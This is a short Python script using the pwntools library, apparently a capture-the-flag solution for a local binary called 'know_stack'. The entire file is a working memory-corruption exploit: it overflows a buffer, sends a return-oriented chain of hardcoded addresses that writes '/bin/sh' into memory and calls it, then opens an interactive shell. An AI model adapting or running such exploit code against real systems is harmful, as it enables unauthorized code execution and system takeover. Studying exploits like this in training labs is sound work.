from pwn import *

p = process("/home/know_stack/know_stack")
context.log_level = "debug"
payload = ""
for i in range(14) :
    payload += p32(0xffffffff)
p.send(payload)
p.recvuntil("\n")
payload2 = ""
payload3 = "/bin/sh\0"
payload3 += p32(0)
for i in range(15) :
    payload2 += p32(0)
for i in range(10) :
    payload2 += p32(0x080485e0)
payload2 += p32(0xb7ef83c0)
payload2 += p32(0x080485dd)
payload2 += p32(0)
payload2 += p32(0x0804a07c)
payload2 += p32(9)
payload2 += p32(0xb7e5b310)
payload2 += p32(0x080485df)
payload2 += p32(0x0804a07c)
p.send(payload2)
p.recvuntil("\n")
p.send(payload3)
p.interactive()
